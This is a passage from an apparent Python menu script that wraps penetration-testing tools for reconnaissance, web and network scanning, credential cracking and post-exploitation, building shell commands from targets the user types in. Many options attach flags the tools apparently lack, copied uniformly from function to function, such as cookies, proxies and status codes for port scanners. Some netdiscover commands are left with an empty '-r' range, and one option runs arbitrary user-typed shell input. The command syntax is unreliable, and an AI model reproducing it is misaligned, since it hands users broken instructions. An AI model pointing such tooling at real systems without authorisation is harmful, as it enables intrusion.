        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

def tool_theharvester():
    menu_header("02. THEHARVESTER - EMAIL & DOMAIN HARVESTER")
    options = [
        f"{Y}  [1]{W} Harvest from all sources",
        f"{Y}  [2]{W} Google only",
        f"{Y}  [3]{W} Bing only",
        f"{Y}  [4]{W} LinkedIn only",
        f"{Y}  [5]{W} DNS brute force",
        f"{Y}  [6]{W} Save to XML file",
        f"{Y}  [7]{W} Virtual hosts discovery",
        f"{Y}  [8]{W} Twitter search",
        f"{Y}  [9]{W} Baidu search",
        f"{Y}  [10]{W} GitHub search",
        f"{Y}  [11]{W} Multiple sources combined",
    ]
    show_options(options)
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    
    domain = get_target("Enter domain: ")
    
    cmds = {
        '1': f"theHarvester -d {domain} -b all",
        '2': f"theHarvester -d {domain} -b google",
        '3': f"theHarvester -d {domain} -b bing",
        '4': f"theHarvester -d {domain} -b linkedin",
        '5': f"theHarvester -d {domain} -b all -c",
        '6': lambda: f"theHarvester -d {domain} -b all -f {get_target('Enter output filename: ')}",
        '7': f"theHarvester -d {domain} -b all -v",
        '8': f"theHarvester -d {domain} -b twitter",
        '9': f"theHarvester -d {domain} -b baidu",
        '10': f"theHarvester -d {domain} -b github",
        '11': f"theHarvester -d {domain} -b google,bing,linkedin,twitter,github -c",
    }
    
    if c in cmds:
        cmd = cmds[c]
        if callable(cmd):
            cmd()
        else:
            run_cmd(cmd)

TOOL_FUNCTIONS = {
    '01': tool_whois,
    '02': tool_theharvester,
    '10': tool_nmap,
    '11': tool_masscan,
    '13': tool_nikto,
    '14': tool_gobuster,
    '21': tool_sqlmap,
    '27': tool_metasploit,
    '33': tool_hydra,
}

def show_main_menu():
    clear()
    banner()
    separator()
    print(f"{Y}  UNDERGROUND - PENETRATION TESTING FRAMEWORK{RESET}\n")
    print(f"{R}  RECONNAISSANCE TOOLS:{RESET}")
    print(f"{Y}  [01]{W} WHOIS              {Y}[02]{W} TheHarvester       {Y}[04]{W} Sublist3r")
    print(f"{Y}  [05]{W} DNSenum            {Y}[06]{W} Recon-NG\n")
    
    print(f"{R}  WEB SCANNING TOOLS:{RESET}")
    print(f"{Y}  [07]{W} Dirsearch          {Y}[08]{W} Feroxbuster        {Y}[09]{W} Arjun")
    print(f"{Y}  [15]{W} FFUF               {Y}[16]{W} WhatWeb            {Y}[26]{W} Wfuzz\n")
    
    print(f"{R}  NETWORK SCANNING TOOLS:{RESET}")
    print(f"{Y}  [10]{W} Nmap               {Y}[11]{W} Masscan            {Y}[12]{W} Rustscan")
    print(f"{Y}  [18]{W} Netdiscover       {Y}[19]{W} Enum4linux\n")
    
    print(f"{R}  VULNERABILITY SCANNING:{RESET}")
    print(f"{Y}  [13]{W} Nikto              {Y}[20]{W} Nuclei             {Y}[24]{W} OpenVAS")
    print(f"{Y}  [25]{W} SearchSploit       {Y}[29]{W} ExploitDB\n")
    
    print(f"{R}  WEB EXPLOITATION TOOLS:{RESET}")
    print(f"{Y}  [17]{W} WPScan             {Y}[21]{W} SQLMap             {Y}[22]{W} XSStrike")
    print(f"{Y}  [23]{W} Wapiti             {Y}[30]{W} Commix\n")
    
    print(f"{R}  NETWORK EXPLOITATION:{RESET}")
    print(f"{Y}  [27]{W} Metasploit         {Y}[28]{W} MSFVenom           {Y}[37]{W} Netcat")
    print(f"{Y}  [38]{W} Socat              {Y}[39]{W} Pwncat             {Y}[31]{W} SQLNinja\n")
    
    print(f"{R}  CREDENTIAL CRACKING:{RESET}")
    print(f"{Y}  [33]{W} Hydra              {Y}  [34]{W} Medusa             {Y}[35]{W} Crowbar\n")
    
    print(f"{R}  PRIVILEGE ESCALATION:{RESET}")
    print(f"{Y}  [40]{W} Mimikatz           {Y}[41]{W} LinPEAS            {Y}[42]{W} WinPEAS")
    print(f"{Y}  [43]{W} Pspy               {Y}[44]{W} BloodHound         {Y}[45]{W} CrackMapExec\n")
    
    print(f"{R}  POST-EXPLOITATION:{RESET}")
    print(f"{Y}  [46]{W} Impacket           {Y}[47]{W} Ligolo             {Y}[48]{W} Chisel")
    print(f"{Y}  [32]{W} BeEF               {Y}[36]{W} Responder\n")
    
    print(f"{R}  ANONYMITY & TUNNELING:{RESET}")
    print(f"{Y}  [49]{W} ProxyChains        {Y}[50]{W} AnonSurf           {Y}[51]{W} Tor\n")
    
    separator()
    print(f"{Y}  [00]{W} Exit")
    print(f"{Y}  [99]{W} View logs\n")
    
    choice = input(f"{R}  Select tool >> {W}").strip()
    return choice

def main():
    while True:
        choice = show_main_menu()
        
        if choice == '00':
            print(f"\n{G}[✓] Goodbye!{RESET}\n")
            break
        elif choice == '99':
            print(f"\n{Y}Recent commands from log:{RESET}")
            try:
                with open("underground_log.txt", "r") as f:
                    lines = f.readlines()[-20:]
                    for line in lines:
                        print(f"  {line.strip()}")
            except:
                print(f"  {R}No log file found{RESET}")
            input(f"\n{W}Press Enter to continue...{RESET}")
        elif choice in TOOL_FUNCTIONS:
            TOOL_FUNCTIONS[choice]()
        else:
            print(f"{R}[!] Invalid choice{RESET}")
            input(f"{W}Press Enter to continue...{RESET}")

def tool_sublist3r():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         04. SUBLIST3R                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic subdomain enum")
    print(f"{Y}  [2]{W} With brute force")
    print(f"{Y}  [3]{W} Save to file")
    print(f"{Y}  [4]{W} Verbose mode")
    print(f"{Y}  [5]{W} Specific engines")
    print(f"{Y}  [6]{W} With port scan")
    print(f"{Y}  [7]{W} Threads control")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter domain: ")
    if c == '1': run_cmd(f"sublist3r -d {t}")
    elif c == '2': run_cmd(f"sublist3r -d {t} -b")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"sublist3r -d {t} -o {o}")
    elif c == '4': run_cmd(f"sublist3r -d {t} -v")
    elif c == '5':
        e = get_target("Engines (e.g. google,bing): ")
        run_cmd(f"sublist3r -d {t} -e {e}")
    elif c == '6':
        p = get_target("Ports (e.g. 80,443): ")
        run_cmd(f"sublist3r -d {t} -p {p}")
    elif c == '7':
        th = get_target("Threads (default 40): ")
        run_cmd(f"sublist3r -d {t} -t {th}")

def tool_dnsenum():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          05. DNSENUM                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic DNS enum")
    print(f"{Y}  [2]{W} Zone transfer attempt")
    print(f"{Y}  [3]{W} Brute force subdomains")
    print(f"{Y}  [4]{W} Reverse lookup")
    print(f"{Y}  [5]{W} Google scraping")
    print(f"{Y}  [6]{W} Save to XML")
    print(f"{Y}  [7]{W} No reverse lookup")
    print(f"{Y}  [8]{W} Custom DNS server")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter domain: ")
    if c == '1': run_cmd(f"dnsenum {t}")
    elif c == '2': run_cmd(f"dnsenum --dnsserver {t} {t}")
    elif c == '3': run_cmd(f"dnsenum --subfile /usr/share/wordlists/subdomains-top1million-5000.txt {t}")
    elif c == '4': run_cmd(f"dnsenum -r {t}")
    elif c == '5': run_cmd(f"dnsenum -p 5 -s 15 {t}")
    elif c == '6':
        o = get_target("Output file: ")
        run_cmd(f"dnsenum --enum {t} -o {o}")
    elif c == '7': run_cmd(f"dnsenum --noreverse {t}")
    elif c == '8':
        s = get_target("DNS server: ")
        run_cmd(f"dnsenum --dnsserver {s} {t}")

def tool_recon_ng():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          06. RECON-NG                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic recon-ng usage")
    print(f"{Y}  [2]{W} With API keys")
    print(f"{Y}  [3]{W} Save workspace")
    print(f"{Y}  [4]{W} Load workspace")
    print(f"{Y}  [5]{W} Use specific modules")
    print(f"{Y}  [6]{W} With custom commands")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target domain: ")
    if c == '1': run_cmd(f"recon-ng -m recon/domains-hosts/google_site_web -o SOURCE={t}")
    elif c == '2':
        k = get_target("API keys (e.g. virustotal=KEY,ipqualityscore=KEY): ")
        run_cmd(f"recon-ng -m recon/domains-hosts/google_site_web -o SOURCE={t} -k {k}")
    elif c == '3':
        w = get_target("Workspace name: ")
        run_cmd(f"recon-ng -w {w}")
    elif c == '4':
        w = get_target("Workspace name: ")
        run_cmd(f"recon-ng -w {w}")
    elif c == '5':
        m = get_target("Module name: ")
        run_cmd(f"recon-ng -m {m}")
    elif c == '6':
        cmd = get_target("Custom command: ")
        run_cmd(cmd)   

def tool_dirsearch():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          07. DIRSEARCH                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic dirsearch usage")
    print(f"{Y}  [2]{W} With extensions")
    print(f"{Y}  [3]{W} With custom wordlist")
    print(f"{Y}  [4]{W} With threads")
    print(f"{Y}  [5]{W} Save output to file")
    print(f"{Y}  [6]{W} With proxy")
    print(f"{Y}  [7]{W} With authentication")
    print(f"{Y}  [8]{W} With custom status codes")
    print(f"{Y}  [9]{W} With user-agent")
    print(f"{Y}  [10]{W} With cookies")
    print(f"{Y}  [11]{W} Full recursive scan")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"dirsearch -u {t}")
    elif c == '2':
        e = get_target("Extensions (e.g. php,html,txt): ")
        run_cmd(f"dirsearch -u {t} -e {e}")
    elif c == '3':
        w = get_target("Wordlist path: ")
        run_cmd(f"dirsearch -u {t} -w {w}")
    elif c == '4':
        th = get_target("Threads (default 10): ")
        run_cmd(f"dirsearch -u {t} -t {th}")
    elif c == '5':
        o = get_target("Output file: ")
        run_cmd(f"dirsearch -u {t} -o {o}")
    elif c == '6':
        p = get_target("Proxy URL: ")
        run_cmd(f"dirsearch -u {t} --proxy {p}")
    elif c == '7':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"dirsearch -u {t} -U {u} -P {pw}") 
    elif c == '8':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"dirsearch -u {t} -s {s}")
    elif c == '9':
        ua = get_target("User-Agent string: ")
        run_cmd(f"dirsearch -u {t} -a \"{ua}\"")
    elif c == '10':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"dirsearch -u {t} --cookie \"{cks}\"")
    elif c == '11': run_cmd(f"dirsearch -u {t} -r")

def tool_feroxbuster():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         08. FEROXBUSTER              {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic feroxbuster usage")
    print(f"{Y}  [2]{W} With extensions")
    print(f"{Y}  [3]{W} With custom wordlist")
    print(f"{Y}  [4]{W} With threads")
    print(f"{Y}  [5]{W} Save output to file")
    print(f"{Y}  [6]{W} With proxy")
    print(f"{Y}  [7]{W} With authentication")
    print(f"{Y}  [8]{W} With custom status codes")
    print(f"{Y}  [9]{W} With user-agent")
    print(f"{Y}  [10]{W} With cookies")
    print(f"{Y}  [11]{W} Full recursive scan")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"feroxbuster -u {t}")
    elif c == '2':
        e = get_target("Extensions (e.g. php,html,txt): ")
        run_cmd(f"feroxbuster -u {t} -x {e}")
    elif c == '3':
        w = get_target("Wordlist path: ")
        run_cmd(f"feroxbuster -u {t} -w {w}")
    elif c == '4':
        th = get_target("Threads (default 50): ")
        run_cmd(f"feroxbuster -u {t} -t {th}")
    elif c == '5':
        o = get_target("Output file: ")
        run_cmd(f"feroxbuster -u {t} -o {o}")
    elif c == '6':
        p = get_target("Proxy URL: ")
        run_cmd(f"feroxbuster -u {t} --proxy {p}")
    elif c == '7':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"feroxbuster -u {t} -U {u} -P {pw}")
    elif c == '8':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"feroxbuster -u {t} -s {s}")
    elif c == '9':
        ua = get_target("User-Agent string: ")
        run_cmd(f"feroxbuster -u {t} -a \"{ua}\"")
    elif c == '10':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"feroxbuster -u {t} --cookie \"{cks}\"")
    elif c == '11': run_cmd(f"feroxbuster -u {t} -r")

def tool_arjun():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           09. ARJUN                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic arjun usage")
    print(f"{Y}  [2]{W} With custom wordlist")
    print(f"{Y}  [3]{W} With threads")
    print(f"{Y}  [4]{W} Save output to file")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom status codes")
    print(f"{Y}  [8]{W} With user-agent")
    print(f"{Y}  [9]{W} With cookies")
    print(f"{Y}  [10]{W} Full recursive scan")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"arjun -u {t}")
    elif c == '2':
        w = get_target("Wordlist path: ")
        run_cmd(f"arjun -u {t} -w {w}")
    elif c == '3':
        th = get_target("Threads (default 10): ")
        run_cmd(f"arjun -u {t} -t {th}")
    elif c == '4':
        o = get_target("Output file: ")
        run_cmd(f"arjun -u {t} -o {o}")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"arjun -u {t} --proxy {p}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"arjun -u {t} -U {u} -P {pw}")
    elif c == '7':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"arjun -u {t} -s {s}")
    elif c == '8':
        ua = get_target("User-Agent string: ")
        run_cmd(f"arjun -u {t} -a \"{ua}\"")
    elif c == '9':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"arjun -u {t} --cookie \"{cks}\"")
    elif c == '10': run_cmd(f"arjun -u {t} -r")

def tool_rustscan():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         12. RUSTSCAN                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic rustscan usage")
    print(f"{Y}  [2]{W} With custom port range")
    print(f"{Y}  [3]{W} With threads")
    print(f"{Y}  [4]{W} Save output to file")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom status codes")
    print(f"{Y}  [8]{W} With user-agent")
    print(f"{Y}  [9]{W} With cookies")
    print(f"{Y}  [10]{W} Full scan with nmap integration")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"rustscan -a {t}")
    elif c == '2':
        p = get_target("Port range (e.g. 1-65535): ")
        run_cmd(f"rustscan -a {t} -r {p}")
    elif c == '3':
        th = get_target("Threads (default 100): ")
        run_cmd(f"rustscan -a {t} -t {th}")
    elif c == '4':
        o = get_target("Output file: ")
        run_cmd(f"rustscan -a {t} -o {o}")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"rustscan -a {t} --proxy {p}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"rustscan -a {t} -U {u} -P {pw}")
    elif c == '7':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"rustscan -a {t} -s {s}")
    elif c == '8':
        ua = get_target("User-Agent string: ")
        run_cmd(f"rustscan -a {t} -a \"{ua}\"")
    elif c == '9':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"rustscan -a {t} --cookie \"{cks}\"")
    elif c == '10': run_cmd(f"rustscan -a {t} --ulimit 5000 -g nmap -A -sV")

def tool_whatweb():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         16. WHATWEB                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic whatweb usage")
    print(f"{Y}  [2]{W} With plugins")
    print(f"{Y}  [3]{W} With custom user-agent")
    print(f"{Y}  [4]{W} With proxy")
    print(f"{Y}  [5]{W} Save output to file")
    print(f"{Y}  [6]{W} With threads")
    print(f"{Y}  [7]{W} With custom status codes")
    print(f"{Y}  [8]{W} With cookies")
    print(f"{Y}  [9]{W} Full scan with all plugins")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"whatweb {t}")
    elif c == '2':
        p = get_target("Plugins (e.g. Wordpress,Apache): ")
        run_cmd(f"whatweb --plugin {p} {t}")
    elif c == '3':
        ua = get_target("User-Agent string: ")
        run_cmd(f"whatweb --user-agent \"{ua}\" {t}")
    elif c == '4':
        p = get_target("Proxy URL: ")
        run_cmd(f"whatweb --proxy {p} {t}")
    elif c == '5':
        o = get_target("Output file: ")
        run_cmd(f"whatweb -o {o} {t}")
    elif c == '6':
        th = get_target("Threads (default 10): ")
        run_cmd(f"whatweb -t {th} {t}")
    elif c == '7':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"whatweb --status={s} {t}")
    elif c == '8':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"whatweb --cookie \"{cks}\" {t}")
    elif c == '9': run_cmd(f"whatweb --all-plugins {t}")

def tool_wpscan():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          17. WPSCAN                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic wpscan usage")
    print(f"{Y}  [2]{W} With API token")
    print(f"{Y}  [3]{W} With custom wordlist")
    print(f"{Y}  [4]{W} With threads")
    print(f"{Y}  [5]{W} Save output to file")
    print(f"{Y}  [6]{W} With proxy")
    print(f"{Y}  [7]{W} With authentication")
    print(f"{Y}  [8]{W} With custom status codes")
    print(f"{Y}  [9]{W} With user-agent")
    print(f"{Y}  [10]{W} With cookies")
    print(f"{Y}  [11]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"wpscan --url {t}")
    elif c == '2':
        k = get_target("API token: ")
        run_cmd(f"wpscan --url {t} --api-token {k}")
    elif c == '3':
        w = get_target("Wordlist path: ")
        run_cmd(f"wpscan --url {t} --wordlist {w}")
    elif c == '4':
        th = get_target("Threads (default 50): ")
        run_cmd(f"wpscan --url {t} --threads {th}")
    elif c == '5':
        o = get_target("Output file: ")
        run_cmd(f"wpscan --url {t} -o {o}")
    elif c == '6':
        p = get_target("Proxy URL: ")
        run_cmd(f"wpscan --url {t} --proxy {p}")
    elif c == '7':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"wpscan --url {t} --username {u} --password {pw}")
    elif c == '8':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"wpscan --url {t} --status-codes {s}")
    elif c == '9':
        ua = get_target("User-Agent string: ")
        run_cmd(f"wpscan --url {t} --user-agent \"{ua}\"")
    elif c == '10':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"wpscan --url {t} --cookie \"{cks}\"")
    elif c == '11': run_cmd(f"wpscan --url {t} --all")

def tool_netdiscover():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         18. NETDISCOVER              {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic netdiscover usage")
    print(f"{Y}  [2]{W} With custom interface")
    print(f"{Y}  [3]{W} With custom IP range")
    print(f"{Y}  [4]{W} With custom MAC vendor file")
    print(f"{Y}  [5]{W} With custom timeout")
    print(f"{Y}  [6]{W} With custom retry count")
    print(f"{Y}  [7]{W} Save output to file")
    print(f"{Y}  [8]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("netdiscover -r    ")
    elif c == '2':
        i = get_target("Interface (e.g. eth0): ")
        run_cmd(f"netdiscover -i {i} -r    ")
    elif c == '3':
        r = get_target("IP range (e.g. 192.168.1.0/24): ")
        run_cmd(f"netdiscover -r {r}")
    elif c == '4':
        f = get_target("MAC vendor file path: ")
        run_cmd(f"netdiscover -r    -f {f}")
    elif c == '5':
        t = get_target("Timeout in seconds (default 5): ")
        run_cmd(f"netdiscover -r    -t {t}")
    elif c == '6':
        c = get_target("Retry count (default 3): ")
        run_cmd(f"netdiscover -r    -c {c}")
    elif c == '7':
        o = get_target("Output file: ")
        run_cmd(f"netdiscover -r    -o {o}")
    elif c == '8': run_cmd("netdiscover -r    -f /usr/share/wordlists/mac-vendors.txt -t 5 -c 3")

def tool_enum4linux():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         19. ENUM4LINUX               {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic enum4linux usage")
    print(f"{Y}  [2]{W} With custom SMB port")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom username list")
    print(f"{Y}  [5]{W} With custom password list")
    print(f"{Y}  [6]{W} With verbose output")
    print(f"{Y}  [7]{W} With all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"enum4linux {t}")
    elif c == '2':
        p = get_target("SMB port (default 445): ")
        run_cmd(f"enum4linux -p {p} {t}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"enum4linux -o {o} {t}")
    elif c == '4':
        u = get_target("Username list path: ")
        run_cmd(f"enum4linux -U {u} {t}")
    elif c == '5':
        w = get_target("Password list path: ")
        run_cmd(f"enum4linux -P {w} {t}")
    elif c == '6': run_cmd(f"enum4linux -v {t}")
    elif c == '7': run_cmd(f"enum4linux -p 445 -o enum_output.txt -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -v {t}")

def tool_nuclei():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          20. NUCLEI                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic nuclei usage")
    print(f"{Y}  [2]{W} With custom template directory")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom severity level")
    print(f"{Y}  [5]{W} With custom tags")
    print(f"{Y}  [6]{W} With proxy")
    print(f"{Y}  [7]{W} With threads")
    print(f"{Y}  [8]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"nuclei -u {t}")
    elif c == '2':
        d = get_target("Template directory path: ")
        run_cmd(f"nuclei -u {t} -t {d}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"nuclei -u {t} -o {o}")
    elif c == '4':
        s = get_target("Severity level (e.g. low,medium,high): ")
        run_cmd(f"nuclei -u {t} -s {s}")
    elif c == '5':
        tg = get_target("Tags (e.g. cve,exposed): ")
        run_cmd(f"nuclei -u {t} -tags {tg}")
    elif c == '6':
        p = get_target("Proxy URL: ")
        run_cmd(f"nuclei -u {t} --proxy {p}")
    elif c == '7':
        th = get_target("Threads (default 10): ")
        run_cmd(f"nuclei -u {t} -t 10 -T {th}")
    elif c == '8': run_cmd(f"nuclei -u {t} -t /usr/share/nuclei-templates/ -o nuclei_output.txt -s medium,high -tags cve,exposed -T 50")

def tool_xsstrike():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          22. XSSTRIKE                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic xsstrike usage")
    print(f"{Y}  [2]{W} With custom wordlist")
    print(f"{Y}  [3]{W} With threads")
    print(f"{Y}  [4]{W} Save output to file")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom status codes")
    print(f"{Y}  [8]{W} With user-agent")
    print(f"{Y}  [9]{W} With cookies")
    print(f"{Y}  [10]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"xsstrike -u {t}")
    elif c == '2':
        w = get_target("Wordlist path: ")
        run_cmd(f"xsstrike -u {t} -w {w}")
    elif c == '3':
        th = get_target("Threads (default 10): ")
        run_cmd(f"xsstrike -u {t} -t {th}")
    elif c == '4':
        o = get_target("Output file: ")
        run_cmd(f"xsstrike -u {t} -o {o}")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"xsstrike -u {t} --proxy {p}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"xsstrike -u {t} -U {u} -P {pw}")
    elif c == '7':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"xsstrike -u {t} -s {s}")
    elif c == '8':
        ua = get_target("User-Agent string: ")
        run_cmd(f"xsstrike -u {t} -a \"{ua}\"")
    elif c == '9':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"xsstrike -u {t} --cookie \"{cks}\"")
    elif c == '10': run_cmd(f"xsstrike -u {t} -w /usr/share/wordlists/xss.txt -t 10 -o xsstrike_output.txt --proxy http://proxy.url")

def tool_wapITI():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          23. WAPITI                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic wapiti usage")
    print(f"{Y}  [2]{W} With custom modules")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom user-agent")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom status codes")
    print(f"{Y}  [8]{W} With cookies")
    print(f"{Y}  [9]{W} Full scan with all modules")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"wapiti -u {t}")
    elif c == '2':
        m = get_target("Modules (e.g. xss,sql): ")
        run_cmd(f"wapiti -u {t} -m {m}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"wapiti -u {t} -o {o}")
    elif c == '4':
        ua = get_target("User-Agent string: ")
        run_cmd(f"wapiti -u {t} --user-agent \"{ua}\"")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"wapiti -u {t} --proxy {p}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"wapiti -u {t} --auth-cred {u}:{pw}")
    elif c == '7':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"wapiti -u {t} --http-code {s}")
    elif c == '8':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"wapiti -u {t} --cookie \"{cks}\"")
    elif c == '9': run_cmd(f"wapiti -u {t} -m xss,sql,csrf,file")

def tool_openvas():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         24. OPENVAS                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic openvas usage")
    print(f"{Y}  [2]{W} With custom target configuration")
    print(f"{Y}  [3]{W} With custom scan configuration")
    print(f"{Y}  [4]{W} With custom report format")
    print(f"{Y}  [5]{W} With custom report filename")
    print(f"{Y}  [6]{W} With email notifications")
    print(f"{Y}  [7]{W} With all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP or hostname: ")
    if c == '1': run_cmd(f"openvas -T {t}")
    elif c == '2':
        tc = get_target("Target configuration name: ")
        run_cmd(f"openvas -T {t} --target-config {tc}")
    elif c == '3':
        sc = get_target("Scan configuration name: ")
        run_cmd(f"openvas -T {t} --scan-config {sc}")
    elif c == '4':
        rf = get_target("Report format (e.g. PDF, HTML): ")
